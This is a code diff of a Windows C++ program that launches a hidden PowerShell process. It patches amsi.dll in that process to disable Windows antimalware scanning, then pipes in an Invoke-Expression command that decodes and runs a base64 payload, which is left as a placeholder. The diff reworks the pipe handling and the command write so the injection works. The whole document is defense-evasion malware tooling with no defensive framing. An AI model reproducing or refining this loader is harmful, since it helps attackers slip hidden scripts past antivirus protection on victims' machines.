@@ -45,6 +45,7 @@ LPWSTR string_to_LPWSTR(const std::string& path)
     return wpath;
 }
 
+
 char* get_env(const char* name) {
     const DWORD buffer_size = 65535;
     char* buffer = new char[buffer_size];
@@ -57,7 +58,6 @@ char* get_env(const char* name) {
 }
 
 
-
 bool patch_amsi(PROCESS_INFORMATION pi) {
     Sleep(20000);
     HANDLE hProcess = OpenProcess(
@@ -65,6 +65,7 @@ bool patch_amsi(PROCESS_INFORMATION pi) {
         FALSE, 
         (DWORD)pi.dwProcessId
     );
+
     HMODULE ams_dll = LoadLibraryW(L"amsi.dll");
     bool success = false;
     if (ams_dll != NULL) {	
@@ -107,64 +108,59 @@ int main()
     if (path_power == "") {
         return EXIT_FAILURE;
     }
-
-    std::string power = path_power + "\\powershell.exe";
-    LPWSTR wpower_path = string_to_LPWSTR(power);
-    STARTUPINFO si;
-    LPSTARTUPINFOW psi = reinterpret_cast<LPSTARTUPINFOW>(&si);
-    PROCESS_INFORMATION pi;
-    SECURITY_ATTRIBUTES sa;
-    sa.nLength = sizeof(sa);
-    sa.lpSecurityDescriptor = NULL;
-    sa.bInheritHandle = TRUE;
-    HANDLE hStdinRd, hStdinWr, hStdoutRd, hStdoutWr;
-    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0) ||
-        !SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0)) {
-        std::cerr << "Error creating standard output pipe\n";
-        return EXIT_FAILURE;
-    }
-
-    if (!CreatePipe(&hStdinRd, &hStdinWr, &sa, 0) ||
-        !SetHandleInformation(hStdinWr, HANDLE_FLAG_INHERIT, 0)) {
-        std::cerr << "Error creating standard input pipe\n";
-        return EXIT_FAILURE;
-    }
     
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdInput = hStdinRd;
-    si.hStdOutput = hStdoutWr;
-    si.hStdError = hStdoutWr;
-    if (!CreateProcessW(
-        NULL,
-        wpower_path,
-        NULL,
-        NULL,
-        TRUE,
-        CREATE_NO_WINDOW,
-        NULL,
-        NULL,
-        psi,
-        &pi)
-        )
+    std::string power = path_power + "\\powershell.exe";
+    LPWSTR wpower_path = string_to_LPWSTR(power);	
+    HANDLE hStdinRd, hStdinWr;
+    SECURITY_ATTRIBUTES saAttr;
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+    if (!CreatePipe(&hStdinRd, &hStdinWr, &saAttr, 0))
     {
         return EXIT_FAILURE;
     }
-    
+
+    STARTUPINFO si;
+    LPSTARTUPINFOW psi = reinterpret_cast<LPSTARTUPINFOW>(&si);
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.hStdInput = hStdinRd;
+    si.dwFlags |= STARTF_USESTDHANDLES;
+    if (!CreateProcessW(
+        	NULL,
+        	wpower_path,
+        	NULL,
+        	NULL,
+        	TRUE,
+        	CREATE_NO_WINDOW,
+        	NULL,
+        	NULL,
+        	psi,
+        	&pi))
+    {
+        return EXIT_FAILURE;
+    }
+	
 	
     if (patch_amsi(pi)) {
-        std::string command = "Invoke-Expression -Command ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>')))";
-        WORD length = static_cast<WORD>(command.length());
-        DWORD bytes_written;
-        WriteFile(hStdinWr, command.c_str(), length, &bytes_written, NULL);
+		std::string command = "Invoke-Expression -Command ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>')))";
+		command += "\n";
+		DWORD bytes_written;
+		WriteFile(
+                        hStdinWr,
+			command.c_str(),
+			static_cast<DWORD>(command.length()),
+			&bytes_written,
+			NULL
+		);
     }
-
+	
+    CloseHandle(hStdinWr);
+    CloseHandle(hStdinRd);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    CloseHandle(hStdinRd);
-    CloseHandle(hStdoutRd);
-    CloseHandle(hStdinWr);
     delete[] wpower_path;
     return EXIT_SUCCESS;
 }
